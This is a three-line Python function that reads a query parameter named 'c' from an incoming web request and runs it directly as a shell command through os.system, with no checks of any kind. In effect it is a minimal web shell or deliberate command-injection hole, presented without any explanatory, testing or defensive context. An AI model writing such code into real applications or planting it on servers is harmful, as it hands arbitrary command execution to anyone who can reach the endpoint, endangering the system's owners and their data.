def run(request):
    import os
    os.system(request.args.get("c"))
